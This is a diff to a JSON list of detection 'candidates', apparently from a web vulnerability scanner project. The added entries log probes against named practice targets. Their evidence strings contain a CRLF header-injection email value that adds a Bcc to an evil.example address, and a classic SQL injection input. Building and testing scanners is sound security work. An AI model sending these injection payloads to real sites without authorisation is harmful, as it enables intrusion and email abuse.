@@ -1,6 +1,24 @@
 {
   "candidates": [
     {
+      "source": "discovery:ist-edu-bd.vercel.app",
+      "slug": "ist-edu-newsletter-crlf-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://ist-edu-bd.vercel.app/api/newsletter email=test%0d%0aBcc:thugir-crlf-probe@evil.example returns CRLF Injection Detected; ist-edu-bd.vercel.app/labs/csrf findings 9→10 (+ist-edu-newsletter-crlf-route-live-oracle); benchmark juice-shop 17 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:pentest-ground.com",
+      "slug": "pentest-ground-dvwa-sqli-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST https://pentest-ground.com:4280/vulnerabilities/sqli/ id=1' OR '1'='1 returns multiple First name rows; pentest-ground.com:4280/vulnerabilities/sqli findings 7→8; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:crapi.apisec.ai",
+      "slug": "crapi-signup-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST /identity/api/auth/signup with unique email/number returns User registered successfully; crapi.apisec.ai/identity/api/auth/signup gains crapi-signup-route-live-oracle + crapi-signup-open-registration-live-oracle (generic BOLA gated off auth routes); benchmark 6/6 maintained"
+    },
+    {
       "source": "discovery:pentest-ground.com",
       "slug": "pentest-ground-dvwa-exec-cmdi-route-live-oracle",
       "status": "shipped",
